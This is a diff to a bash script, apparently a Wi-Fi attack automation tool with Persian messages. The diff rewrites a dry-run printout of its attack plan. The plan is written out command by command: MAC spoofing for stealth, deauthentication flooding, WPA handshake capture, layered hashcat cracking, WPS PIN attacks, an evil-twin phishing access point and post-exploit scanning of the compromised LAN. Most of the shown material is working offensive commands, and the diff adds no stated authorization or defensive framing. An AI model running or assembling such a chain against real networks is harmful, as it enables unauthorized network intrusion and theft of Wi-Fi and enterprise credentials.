@@ -135,62 +135,66 @@ mkdir -p "$REPORT"
   echo "  Planned execution (no tools will run)"
   echo "═══════════════════════════════════════════════════"
   echo
-  echo "[0] Setup"
-  echo "    airmon-ng check kill"
-  echo "    airmon-ng start \$IFACE"
-  echo "    macchanger -r \$MON  (stealth only)"
-  echo
-  echo "[0.5] Passive recon (if kismet installed)"
-  echo "    timeout 30 kismet -c \$MON --daemonize"
-  echo
+  cat <<'PLAN'
+[0] Setup
+    airmon-ng check kill
+    airmon-ng start $IFACE
+    macchanger -r $MON  (stealth only)
+
+[0.5] Passive recon (if kismet installed)
+    timeout 30 kismet -c $MON --daemonize
+
+PLAN
   echo "[1] Capture (${CAPTURE:-120}s)"
-  echo "    hcxdumptool -i \$MON -o \$CAP [filterlist_ap=\$TARGET]"
-  echo "    mdk4 \$MON d -b \$WORK/blacklist  (background, every 5s)"
-  echo "    airodump-ng --band abg --output-format csv -w \$WORK/scan \$MON"
-  echo "    tshark -r \$CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity"
-  echo "    tshark -r \$CAP -Y 'wps' -T fields -e wlan.bssid"
-  echo
-  echo "[2] Extract & normalize"
-  echo "    hcxpcapngtool -o \$WORK/raw.hc22000 -E \$WORK/essids.txt --eapmschapv2=\$WORK/mschapv2.txt \$CAP"
-  echo "    hcxhashtool -i \$WORK/raw.hc22000 -o \$HASH --essid-group"
-  echo
-  echo "[3] Crack (hashcat layers 0-8)"
-  echo "    0: cowpatty -r \$CAP -f <wordlist> -s <essid>"
-  echo "    1: hashcat -m 22000 -a 0 \$HASH \$WORK/dicts/vendor.txt"
-  echo "    2: hashcat -m 22000 -a 0 \$HASH <wordlist>"
-  echo "    3: hashcat -m 22000 -a 0 \$HASH <wordlist> -r best64.rule"
-  echo "    4: hashcat -m 22000 -a 3 \$HASH '?d?d?d?d?d?d?d?d'"
-  echo "    5: hashcat -m 22000 -a 3 \$HASH '?d?d?d?d?d?d?d?d?d?d'"
-  echo "    6: hashcat -m 22000 -a 3 \$HASH '09?d?d?d?d?d?d?d?d?d'"
-  echo "    7: hashcat -m 22000 -a 6 \$HASH \$WORK/dicts/vendor.txt '?d?d?d?d'"
-  echo "    8: hashcat -m 22000 -a 0 \$HASH <wordlist> -r dive.rule"
-  echo "    9: hashcat -m 22000 -a 0 \$HASH <keyboard-walk>"
-  echo "    E: hashcat -m 5500 \$WORK/mschapv2.txt <wordlist>  (Enterprise)"
-  echo
-  echo "[4] WPS (if DO_WPS and WPS-enabled APs found)"
-  echo "    wash -i \$MON -o \$WORK/wps-scan.txt"
-  echo "    reaver -i \$MON -b <bssid> -c <ch> -K 1 -N -vv -d 5"
-  echo "    bully -b <bssid> -c <ch> -d \$WORK/bully-<bssid> \$MON"
-  echo
-  echo "[5] Evil Twin (if no cracks and DO_TWIN)"
-  echo "    hostapd-mana \$WORK/mana.conf  (or wifiphisher)"
-  echo "    sleep 180"
-  echo
-  echo "[6] Post-exploit (if cracks found and DO_POST)"
-  echo "    nmap -sn 192.168.1.0/24"
-  echo "    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24"
-  echo "    generate \$REPORT/connect.sh (nmcli + bettercap)"
-  echo
-  echo "[7] Report"
-  echo "    \$REPORT/summary.md"
-  echo "    \$REPORT/summary.json"
+  cat <<'PLAN'
+    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
+    mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
+    airodump-ng --band abg --output-format csv -w $WORK/scan $MON
+    tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
+    tshark -r $CAP -Y 'wps' -T fields -e wlan.bssid
+
+[2] Extract & normalize
+    hcxpcapngtool -o $WORK/raw.hc22000 -E $WORK/essids.txt --eapmschapv2=$WORK/mschapv2.txt $CAP
+    hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
+
+[3] Crack (hashcat layers 0-8)
+    0: cowpatty -r $CAP -f <wordlist> -s <essid>
+    1: hashcat -m 22000 -a 0 $HASH $WORK/dicts/vendor.txt
+    2: hashcat -m 22000 -a 0 $HASH <wordlist>
+    3: hashcat -m 22000 -a 0 $HASH <wordlist> -r best64.rule
+    4: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d'
+    5: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d?d?d'
+    6: hashcat -m 22000 -a 3 $HASH '09?d?d?d?d?d?d?d?d?d'
+    7: hashcat -m 22000 -a 6 $HASH $WORK/dicts/vendor.txt '?d?d?d?d'
+    8: hashcat -m 22000 -a 0 $HASH <wordlist> -r dive.rule
+    9: hashcat -m 22000 -a 0 $HASH <keyboard-walk>
+    E: hashcat -m 5500 $WORK/mschapv2.txt <wordlist>  (Enterprise)
+
+[4] WPS (if DO_WPS and WPS-enabled APs found)
+    wash -i $MON -o $WORK/wps-scan.txt
+    reaver -i $MON -b <bssid> -c <ch> -K 1 -N -vv -d 5
+    bully -b <bssid> -c <ch> -d $WORK/bully-<bssid> $MON
+
+[5] Evil Twin (if no cracks and DO_TWIN)
+    hostapd-mana $WORK/mana.conf  (or wifiphisher)
+    sleep 180
+
+[6] Post-exploit (if cracks found and DO_POST)
+    nmap -sn 192.168.1.0/24
+    nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24
+    generate $REPORT/connect.sh (nmcli + bettercap)
+
+[7] Report
+    $REPORT/summary.md
+    $REPORT/summary.json
+PLAN
   echo
   echo "✓ Simulation complete. No changes were made."
   echo
   exit 0
 }
 
-[ "$(id -u)" -eq 0 ] || { err "با sudo اجرا کن."; exit 1; }
+(( EUID == 0 )) || { err "با sudo اجرا کن."; exit 1; }
 if ! command -v hashcat >/dev/null || ! command -v hcxdumptool >/dev/null || ! command -v iw >/dev/null; then
   err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1
 fi
@@ -458,7 +462,7 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
     parse_wps_csv > "$WORK/wps-cands.txt"
   fi
   while read -r b ch; do
-    grep -q "$b" "$WORK/cracked.txt" 2>/dev/null && continue
+    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
     [ -z "$ch" ] && continue
     # reaver Pixie Dust
     if command -v reaver >/dev/null; then
